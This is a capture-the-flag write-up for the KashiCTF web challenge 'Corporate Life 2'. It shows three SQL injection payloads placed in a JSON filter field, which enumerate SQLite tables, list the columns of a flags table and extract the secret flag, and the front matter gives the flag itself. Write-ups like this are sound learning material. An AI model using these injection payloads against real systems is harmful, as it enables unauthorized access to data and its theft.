---
title: "Corporate Life 2"
category: Web Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
flag: KashiCTF{did_some_trolling_right_there_vSVU9bzY}
---
> ~

---

Continuation of `Corporate Life 1`, where the same payload did not return a flag. Instead, i attempted to enumerate the database structure to locate relevant tables.

## Database Enumeration

To identify tables in the database, i used the following **SQL injection** payload:

```json
{
  "filter": "1' UNION SELECT name, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table' --"
}
```

Once the table names were retrieved, i focused on the `flags` table and attempted to enumerate its columns using:

```json
{
  "filter": "1' UNION SELECT name, NULL, NULL, NULL, NULL, NULL FROM pragma_table_info('flags') --"
}
```

## Extracting the Flag

After identifying the `secret_flag` column in the `flags` table, I extracted its contents with the following payload:

```json
{
  "filter": "1' UNION SELECT request_id, secret_flag, NULL, NULL, NULL, NULL FROM flags --"
}
```

This successfully revealed the flag.
